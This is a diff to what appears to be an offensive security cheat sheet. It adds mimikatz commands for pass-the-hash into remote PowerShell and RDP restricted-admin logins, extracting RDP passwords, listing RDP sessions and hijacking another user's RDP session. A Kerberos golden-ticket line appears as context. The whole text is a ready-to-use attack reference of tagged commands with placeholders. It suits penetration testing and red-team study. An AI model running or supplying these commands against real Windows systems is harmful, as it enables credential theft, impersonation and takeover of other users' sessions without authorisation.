@@ -124,10 +124,35 @@ kerberos::golden /user:<user> /domain:<domain> /sid:<child_sid> /krbtgt:<krbtgt_
 
 % mimikatz, pth
 
-
-## mimikatz pth run powershell remotelly
+## pth run powershell remotelly
 #plateform/windows  #target/local  #cat/ATTACK/PTH 
 Followed by : Enter-PSSession -Computer {<}computer_name}
 ```
 sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell
+```
+
+## pth to RDP
+#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/ATTACK/PTH
+```
+sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:"mstsc.exe /restrictedadmin"
+```
+
+% mimikatz, rdp
+
+## Extract RDP passwords
+#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 
+```
+ts::logonpasswords
+```
+
+## List RDP sessions 
+#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/RECON
+```
+ts::sessions
+```
+
+## Hijack RDP session 
+#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/ATTACK/HIJACK
+```
+ts::remote /id:<id>
 ```
